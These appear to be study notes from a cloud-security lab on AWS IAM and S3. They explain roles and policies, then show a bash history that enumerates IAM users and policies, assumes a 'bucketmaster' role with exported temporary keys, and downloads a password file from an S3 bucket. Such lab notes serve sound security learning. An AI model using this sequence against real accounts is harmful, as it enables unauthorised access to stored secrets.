

# AWS

*NOTE: AWS accounts can be accessed programmatically by using an Access Key ID and a Secret Access Key.*

### IAM
Identity and Access Management (IAM) is a framework/process for controlling and securing digital identities and user access in organisations.

- IAM Users
- IAM Groups
- IAM Roles: An IAM Role is a temporary identity that can be assumed by a user, as well as by services or external accounts, to get certain permissions
- IAM Policies: Access provided to any user, group or role is controlled through IAM policies. A policy is a JSON document that defines the following:
	- What action is allowed (Action)
	- On which resources (Resource)
	- Under which conditions (Condition)
	- For whom (Principal)


SirCarrotbanePolicy

### S3
Simple Storage Service (S3) is a service provided by Amazon Web Services (AWS) that allows you to store data in a scalable and reliable way. Data is stored on buckets, which act as a folder in the cloud where you can store files, applications, backup information or anything you need.

## Bash History of Machine
```bash
    1  whoami
    2  clear
    3  awa sts get-caller-identity
    4  cclear
    5  clear
    6  aws sts get-caller-identity
    7  awa iam list-users
    8  clear
    9  aws iam list-users
   10  aws iam list-user-policies --user-name sir.carrotbane
   11  aws iam list-attached-user-policies --user-name sir.carrotbane
   12  aws iam list-groups-for-user --user-name sir.carrotbane
   13  aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane
   14  aws iam list-roles
   15  aws iam list-role-policies --role-name bucketmaster
   16  aws iam list-attached-role-policies --role-name bucketmaster
   17  aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
   18  aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
   19  export AWS_ACCESS_KEY_ID="access key id"
   20  export AWS_SECRET_ACCESS_KEY="secret access key"
   21  export AWS_SESSION_TOKEN="session token"
   22  aws sts get-caller-identify
   23  aws sts get-caller-identity
   24  aws s3api list-buckets
   25  aws s3api list-objects --bucket easter-secrets-123145
   26  aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
   27  ls
   28  cat cloud_password.txt 
   29  clear
   30  history
```
